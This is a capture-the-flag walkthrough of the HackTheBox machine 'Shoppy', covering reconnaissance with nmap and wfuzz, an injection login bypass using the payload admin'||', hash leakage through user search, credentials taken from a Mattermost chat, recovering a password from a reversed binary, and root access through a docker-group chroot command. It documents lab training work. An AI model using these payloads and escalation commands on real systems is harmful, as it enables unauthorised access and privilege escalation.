**Initial Nmap Scan**

22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.23.1

Classic ports are open 22 ,80 and also nmap reveal the hostname http://shoppy.htb.
Added the hostname to host file /etc/hosts and access the web page

Running feroxbuster found two endpoints
```bash
/Admin 
/login
```
Subdomain
```bash
wfuzz -c -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -w /opt/SecLists/Discovery/DNS/namelist.txt --hw 11
000082865:   200        0 L      141 W      3122 Ch     "mattermost"

```
it take long time to find the subdomain
```bash
Total time: 3455.694
Processed Requests: 101510
Filtered Requests: 101509
Requests/sec.: 29.37470
```

mattermost.shoppy.htb

**login auth bypass**

**Note about reqeust handling***

The orginal web server is running behind the proxy that's means every time the request going to the proxy aka gateway and it's pass through the upstream server. In the login form we put ' as value in username parameter we get a gateway time-out response because the gateway did'nt get the response from the upstream server from that point we can sure about the upstream server can't handle our "'"
value 

trying to inject sql querys but it's failed so moving to bypass the login we know the login endpoint
is used to log on the admin user so defently a user called admin is their

Create a authbypass payload from hacktricks starting "'" and start the intruder and set the payload postion like admin$$ and load the bypasslist. Finaly we got the bypass payload from intruder 

"admin'||'"

referance [https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

**Addional Findings**

Convert the post /login body from www-url-encode-form to json

Json body

{"username":"admin","passwoed":"admin"}

intentionly create a error in json data.we get a error response revealing
it's running a Nodejs web app 

Norming nodejs comming with **MEAN** stack


**Foothold**

After bypass the login their is search option to search the users. I search for admin user
it's reveal the admin hash and id. inject the bypass payload in search option it reveal another user 
called josh and his password hash

josh:6ebcea65320589ca4f2f1ce039975995:remembermethisway                                 

login the mattermost.shoppy.htb

```
Mattermost is an open-source, self-hostable online chat service with file sharing, search, and integrations. It is designed as an internal chat for organisations and companies, and mostly markets itself as an open-source alternative to Slack and Microsoft Teams.
```
orginal mattermost site link [https://mattermost.com/](https://mattermost.com/)
we found these username and password form the chat history of deploy channel in mattermost

username: jaeger
password: Sh0ppyBest@pp!

ssh as jaeger

**move jaeger to more privilleged user deploy**

In the deploy home dir there is a elf called password-manager created using c++ and also in the dir has the source code of elf and a txt file named creds.txt. strings the elf we get some information about how the password-manager has been worked it's cat the creds.txt. now we know how the password-manager worked but we need password to access the password-manager.using GHIDRA i decomplied the binary found the password "Sample".jaeger has sudo permision to run password-manger as deploy

```bash
sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```
**Switching to deploy**

Running id command deploy user has in docker group because the mattermost chat application
hosted in docker container

abusing docker and owned root

This requires the user to be privileged enough to run docker, i.e. being in the docker group or being root.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
referance GTFObins [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)